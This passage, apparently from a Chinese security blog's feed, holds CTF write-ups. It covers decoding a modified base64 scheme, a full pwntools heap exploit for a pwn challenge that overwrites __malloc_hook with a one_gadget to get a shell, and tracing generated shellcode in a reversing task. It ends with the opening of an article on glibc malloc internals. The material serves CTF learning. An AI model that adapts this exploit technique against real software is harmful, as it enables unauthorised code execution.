v17[<span class="number">1</span>] = v27;</span><br><span class="line">          <span class="keyword">if</span> ( v29 + <span class="number">1</span> &gt;= v24 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v33 = v29 == <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v29 != <span class="number">2</span> )</span><br><span class="line">            v33 = v37 + <span class="number">2</span> == v29;</span><br><span class="line">          <span class="keyword">if</span> ( v33 )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = (v36 &amp; <span class="number">0xC0</span>);</span><br><span class="line">            v34 = v44++ + v29;</span><br><span class="line">            v26[v34] = aAbcdefghijklmn[v26[v34] | (v17 &gt;&gt; <span class="number">6</span>)] ^ <span class="number">0xF</span>;</span><br><span class="line">            v27 = &amp;v26[v34];</span><br><span class="line">            *(v27 + <span class="number">1</span>) = aAbcdefghijklmn[v36 &amp; <span class="number">0x3F</span>];</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v26[v44 + v29] = aAbcdefghijklmn[v36 &gt;&gt; <span class="number">2</span>] ^ <span class="number">7</span>;</span><br><span class="line">        v17 = &amp;v26[v44 + v29];</span><br><span class="line">        v27 = <span class="number">16</span> * v36 &amp; <span class="number">0x30</span>;</span><br><span class="line">        v17[<span class="number">1</span>] = v27;</span><br><span class="line">        <span class="keyword">if</span> ( v29 + <span class="number">1</span> &gt;= v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          v38 = aAbcdefghijklmn[v27];</span><br><span class="line">          *(v17 + <span class="number">1</span>) = <span class="string">&#x27;;;&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v29;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v29 &lt; v24 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v43 )</span><br><span class="line">    &#123;</span><br><span class="line">      v32 = <span class="number">1</span>;</span><br><span class="line">      v17 = v42;</span><br><span class="line">      v39 = &amp;byte_CDEAD4E8;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v26[v25++];</span><br><span class="line">        v40 = *v39++;</span><br><span class="line">        <span class="keyword">if</span> ( v40 != v27 )</span><br><span class="line">          v32 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v25 &lt; v42 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v32 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v26 = (_stack_chk_guard - v48);</span><br><span class="line">    <span class="keyword">if</span> ( _stack_chk_guard == v48 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_53:</span><br><span class="line">    v38 = v32[v27];</span><br><span class="line">    v17[<span class="number">2</span>] = <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    v17[<span class="number">1</span>] = v38;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v32;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>乍一看很像 BASE 64 算法，而且还给出了“表盘”和密文</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">!:#&quot;,0x24,&quot;%&amp;()+-*/`~_[]&#123;&#125;?&lt;&gt;,.@^abcdefghijklmnopqrstuvwxyz01234</span><br><span class="line"></span><br><span class="line">&#123;9*8ga*l!Tn?@#fj&#x27;j$\g;;</span><br></pre></td></tr></table></figure></div>

<p>但是找了很多 BASE64 算法(各种语言的都试了一次)，没有一个能够正常解码，后来通过调试仔细分析了一下代码，发现算法虽然和 BASE64 很像，但是里面夹杂了额外的操作，例如异或和移位等等，将算法整理出来，然后编写了一个 python 脚本尝试解密成功。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">r&quot; &#123;9*8ga*l!Tn?@#fj&#x27;j$\g;;&quot;</span></span><br><span class="line">table = <span class="string">r&quot;!:#$%&amp;()+-*/`~_[]&#123;&#125;?&lt;&gt;,.@^abcdefghijklmnopqrstuvwxyz0123456789\&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">ord</span>(table[x &gt;&gt; <span class="number">2</span>]) ^ <span class="number">7</span>) == <span class="built_in">ord</span>(enc[<span class="number">20</span>]) <span class="keyword">and</span> \</span><br><span class="line">                <span class="built_in">ord</span>(table[((<span class="number">16</span> * x) &amp; <span class="number">48</span>) | (y &gt;&gt; <span class="number">4</span>)]) == <span class="built_in">ord</span>(enc[<span class="number">21</span>]) <span class="keyword">and</span> \</span><br><span class="line">               (<span class="built_in">ord</span>(table[((<span class="number">4</span> * y) &amp; <span class="number">0x3c</span>) | (z &gt;&gt; <span class="number">6</span>)]) ^ <span class="number">0xf</span>) == <span class="built_in">ord</span>(enc[<span class="number">22</span>]) <span class="keyword">and</span> \</span><br><span class="line">                <span class="built_in">ord</span>(table[z &amp; <span class="number">0x3f</span>]) == <span class="built_in">ord</span>(enc[<span class="number">23</span>])):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(x ^ <span class="number">0x08</span>),<span class="built_in">chr</span>(y ^ <span class="number">0x38</span>),<span class="built_in">chr</span>(z ^ <span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># fu0kzHp2aqtZAuY64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">ord</span>(table[x &gt;&gt; <span class="number">2</span>]) ^ <span class="number">7</span>) == <span class="built_in">ord</span>(enc[<span class="number">20</span>]) <span class="keyword">and</span> \</span><br><span class="line">            <span class="built_in">ord</span>(table[((<span class="number">16</span> * x) &amp; <span class="number">48</span>) | (y &gt;&gt; <span class="number">4</span>)]) == <span class="built_in">ord</span>(enc[<span class="number">21</span>])):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(x ^ <span class="number">0x08</span>),<span class="built_in">chr</span>(y ^ <span class="number">0x38</span>))</span><br><span class="line"><span class="comment"># 三个字符转4个字符，内部数据需要手动转换</span></span><br></pre></td></tr></table></figure></div>

<p>最后可以解出密码为  fu0kzHp2aqtZAuY64</p>
<h2 id="拯救单身狗"><a href="#拯救单身狗" class="headerlink" title="拯救单身狗"></a>拯救单身狗</h2><p>这是一道比较简单的 pwn 题，其主要漏洞点在编辑堆块的时候 index 会越界。我们可以利用越界的指针去修改其他堆块，例如 edit_singledog 却修改了 luckydog。</p>
<p>题目的一大坑点在于没有给出 libc，也就是说 2.23 和 2.27 两个版本都有可能，我一开始编写了 2.23 的利用脚本，本地测试通过，但是拿到远程服务器就会崩溃，检查原因是地址没有正确的泄露，猜测远程服务器是 2.27 版本的 libc，由于 2.27 存在 tcache 机制，所以需要先将 tcache 填满。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./apwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_single</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name:\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_lucky</span>(<span class="params">name, name2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;your partner&#x27;s name\n&quot;</span>)</span><br><span class="line">    p.sendline(name2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_single</span>(<span class="params">index, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Oh,singledog,changing your name can bring you good luck.\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_lucky</span>(<span class="params">index, name, name2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Oh,luckydog,What is your new name?\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;your partner&#x27;s new name\n&quot;</span>)</span><br><span class="line">    p.sendline(name2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">add_lucky(<span class="string">&quot;bbbbbbbb&quot;</span>, <span class="string">&quot;cccccccc&quot;</span>)</span><br><span class="line">edit_single(<span class="number">80</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">p.recv(<span class="number">11</span>)</span><br><span class="line">heap_addr = u64((<span class="string">&#x27;\x00&#x27;</span> + p.recv(<span class="number">5</span>)).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x200</span></span><br><span class="line">log.info(<span class="string">&quot;heap_addr : 0x%x&quot;</span> % heap_addr)    <span class="comment"># leak heap_addr</span></span><br><span class="line"><span class="comment">#edit_single(80, p64(heap_addr + 0x6d0))    # recover chunk_in_lucky struct</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 5</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 7</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 8</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 10</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 11</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 13</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 14</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 15</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 16</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 17</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 18</span></span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 19</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 20</span></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add_single(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x6c0</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x6d0</span> - <span class="number">0x410</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x750</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x760</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x7e0</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x7f0</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x870</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x880</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x900</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x910</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x990</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0x9a0</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xa20</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xa30</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xab0</span> - <span class="number">0x410</span>))    <span class="comment"># sub lucky_name2 pointer 0x10</span></span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">edit_single(<span class="number">80</span>, p64(heap_addr + <span class="number">0xac0</span> - <span class="number">0x410</span>))</span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line">add_single(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">17</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">p.recv(<span class="number">10</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebd0a</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr : 0x%x&quot;</span> % libc_addr)    <span class="comment"># leak necessary address</span></span><br><span class="line">malloc_hook = libc_addr + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_addr + <span class="number">0x10a38c</span></span><br><span class="line">log.info(<span class="string">&quot;malloc_hook : 0x%x&quot;</span> % malloc_hook)</span><br><span class="line">log.info(<span class="string">&quot;one_gadget : 0x%x&quot;</span> % one_gadget)</span><br><span class="line"></span><br><span class="line">edit_single(<span class="number">80</span>, p64(malloc_hook))</span><br><span class="line">edit_lucky(<span class="number">0</span>, <span class="string">&quot;fuckfuck&quot;</span>, p64(one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="影分身之术"><a href="#影分身之术" class="headerlink" title="影分身之术"></a>影分身之术</h2><p>拿到题目上网搜索了一下，和某年的题目很相似，按照网上的 wp，将程序中屏蔽右键菜单的函数进行 patch，然后运行程序通过查看源代码得到一段 js</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sptWBCallback</span>(<span class="params">spt_wb_id, spt_wb_name, optionstr</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        url = <span class="string">&#x27;#sptWBCallback:id=&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        url = url + spt_wb_id + <span class="string">&#x27;;eventName=&#x27;</span> + spt_wb_name;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (optionstr) url = url + <span class="string">&#x27;;params=optionstr&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        location = url;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">ckpswd</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">	key = <span class="string">&quot;simpower91&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	a = <span class="variable language_">document</span>.<span class="property">all</span>.<span class="property">pswd</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span> (a.<span class="title function_">indexOf</span>(key) == <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		l = a.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">		i = key.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">sptWBCallback</span>(a.<span class="title function_">substring</span>(i, l));</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="string">&quot;wrong!&lt;&quot;</span> + a + <span class="string">&quot;&gt; is not my GUID ;-)&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> <span class="string">&quot;1234&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">ok</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">alert</span>(<span class="string">&quot;congratulations!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">CTF 2019<span class="symbol">&amp;reg;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pswd&quot;</span> <span class="attr">size</span>=<span class="string">39</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">value</span>=<span class="string">&quot;checkMyFlag&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;ckpswd();&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>从 js 里面看到一部分代码逻辑，首先 key 是由 simpower91 开头，后跟一定长度的其他字符，验证正确之后会调用 sptWBCallback 函数，这个函数负责与程序中的原生代码进行交互，它会将 simpower91 进行剔除，只留下剩余的字符到程序中进行下一步验证。</p>
<p>通过动态调试分析，00492088 处的函数用来处理 sptWBCallback  发送的请求，其内部调用了一个隐藏函数，静态分析不能确定它的地址，通过调试得到隐藏函数的地址为 00493F70，简单分析一下这个函数可以得知我们的输入为 4 个字节</p>
<p>这个函数又调用了很多其他函数，我动态调试了很久也没有看懂在做些什么，于是换了一种思路，当程序获取到输入的时候，在相应的内存区域下硬件断点，F9 几次来到 0047162C 函数内部，从这里开始去我们输入的字符串进行了一堆看不懂的操作，不过在 0x94000 地址附近我发现了一些动态生成的数据，而且程序进入了某种循环当中，每次循环都会对这里的数据进行一些操作。</p>
<p>直到一条 long jmp 指令，会将程序执行流定位到这段数据中，这时我才发现所谓的数据原来是一段动态生成的 shellcode，其功能是将每个字符加上 0x7f，之后会和预置的数据进行对比。那么通过单步跟踪找到这 4 组数据解密就可以得到真正的密码。</p>
<p>最终得到 flag ：simpower91a123</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>glibc 中的 malloc 与 free 概述 (一)</title>
    <url>/2019/03/07/glibc_analyse1/</url>
    <content><![CDATA[<h2 id="〇"><a href="#〇" class="headerlink" title="〇."></a>〇.</h2><p>最近做一些堆利用的题目时感觉基础掌握的不是很牢靠，之前没有仔细的研究过 glibc 中的内存管理策略，导致遇到某些题目的时候总是会忽略掉重要的细节(libc 层面)，所以这次就来仔细研究一下 malloc 和 free 的实现。<br><strong>文章中难免有疏漏，欢迎大家指正。</strong></p>
<p>Update: 2020-11-02</p>
<span id="more"></span>

<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>动态内存管理是很重要的功能，内存一直都是很宝贵的资源，一个好的内存管理策略可以极大地提升系统性能，就 C 内存管理而言，主要的管理程序有</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Doug Lea Malloc</span><br><span class="line">BSD Malloc</span><br><span class="line">Hoard</span><br><span class="line">TCMalloc</span><br><span class="line">ptmalloc</span><br></pre></td></tr></table></figure></div>

<p>目前主流 Linux 系统所使用的都是 ptmalloc，由 Wolfram Gloger 基于 Doug Lea Malloc 修改而来。ptmalloc 包括 malloc free 等一组函数，实现了动态的内存管理，区别一个内存管理器好坏的重要标准就是 分配和释放内存的速度。</p>
<p>当 Linux 加载了一个可执行程序时，会先将程序从硬盘上映射到内存中， 以 32 位程序为例，映射的顺序为 .text段、.data段、.bss段，接着会生成 stack 区域以及 heap 区域、mmap 区域。一个典型的 32 位程序的内存布局大致如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_1.png"
                      alt="malloc_free_1.png"
                ></p>
<p>其中，内核区域占据 1GB 空间，用户程序占据 3GB 空间，但是同一时间可以运行多个程序，如果整个内存被一个程序全部占据的话，其他程序是不是就无法运行了呢？其实不然，可以参考 windows 的实现方法，系统为每个程序分配了虚拟内存，只是在逻辑上每个程序占据着整块内存，但实际上物理内存中同时存在很多程序，操作系统通过虚拟内存管理器将虚拟地址映射到物理地址上面，保证系统正常工作。</p>
<p>实现内存管理主要有三个层面，分别是用户管理层、C 运行时库层以及操作系统层，操作系统层提供了最底层的内存管理方案如 syscall，linux 操作系统提供了 brk() 函数来实现内存的分配，而 C 运行时库则提供了 sbrk() 函数，我们常用的 malloc free 等类似的函数就是使用了 C 运行库提供的函数。</p>
<p>当程序向操作系统申请动态内存时，系统会调用相应的函数分配内存，但是这种分配并不是实时的，首先内核会给程序分配一个线性区(虚拟内存)，只有当用户开始使用这块内存时，才会分配物理页面。当释放一块内存时，会通过线性区找到物理页面，然后才执行释放操作。</p>
<p>为了提高内存管理效率，ptmalloc 设置了一些缓冲区，当用户分配内存时，ptmalloc 会优先检查缓冲区中是否存在合适的空间，如果存在就直接返回给用户，这样大大降低了向内核申请空间的次数。同样的，当用户释放某块内存时，ptmalloc 会将这块内存插入对应的缓冲区内，以便于下一次分配使用，这些缓冲区就是所谓的 fastbin、smallbin 等等链表。</p>
<p>ptmalloc 的几个特性</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 需要长时间保存、使用的内存(存活期长)的分配使用 mmap</span><br><span class="line">2. 很大的内存分配使用 mmap</span><br><span class="line">3. 存活期短的内存块使用 brk 分配</span><br><span class="line">4. 尽量只缓存较小的内存块，很大的内存块在释放之后立即归还操作系统</span><br><span class="line">5. 空闲的内存块(处于缓冲区中)只在 malloc 和 free 时进行合并</span><br></pre></td></tr></table></figure></div>

<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>本部分根据 malloc.c 代码注释以及逻辑对 malloc 进行了简要分析。</p>
<p>代码可以在 <a class="link"   href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#_M/void" >woboq<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 找到。</p>
